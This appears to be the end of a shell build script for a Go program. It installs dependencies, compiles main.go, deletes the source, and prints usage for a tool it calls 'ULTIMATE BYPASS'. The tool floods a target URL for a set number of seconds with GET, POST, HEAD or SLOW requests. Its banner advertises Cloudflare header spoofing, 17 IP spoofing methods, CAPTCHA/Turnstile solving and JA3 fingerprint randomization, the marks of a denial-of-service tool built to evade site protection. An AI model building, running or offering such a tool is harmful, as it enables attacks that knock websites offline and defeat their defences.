export CGO_ENABLED=0

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies WITH FIXES
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.24.0 2>&1 | grep -v "go: downloading" || true
go get github.com/chromedp/chromedp@latest 2>&1 | grep -v "go: downloading" || true
go get golang.org/x/text@v0.14.0 2>&1 | grep -v "go: downloading" || true
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up with retry logic
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy 2>&1 || {
    echo -e " ${YELLOW}⚠ Tidy failed, retrying with explicit text package...${NC}"
    go get golang.org/x/text/secure/bidirule golang.org/x/text/unicode/bidi golang.org/x/text/unicode/norm
    go mod tidy
}
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
go build -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE - ULTIMATE BYPASS${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy] [--solve]${NC}"
    echo
    echo -e " ${GREEN}Examples:${NC}"
    echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.com 120 POST --solve${NC}"
    echo -e "   ${YELLOW}./main https://target.com 30 HEAD proxy --solve${NC}"
    echo
    echo -e " ${GREEN}FEATURES:${NC}"
    echo -e "   • 45+ Cloudflare headers"
    echo -e "   • 17 IP spoofing methods"
    echo -e "   • Turnstile/CAPTCHA solving (--solve)"
    echo -e "   • JA3 fingerprint randomization"
    echo -e "   • HTTP/2 + HTTP/1.1 support"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Run these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
    echo -e "   ${BLUE}3.${NC} go get github.com/chromedp/chromedp@latest"
    echo -e "   ${BLUE}4.${NC} go get golang.org/x/text@v0.14.0"
    echo -e "   ${BLUE}5.${NC} go mod tidy"
    echo -e "   ${BLUE}6.${NC} go build -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
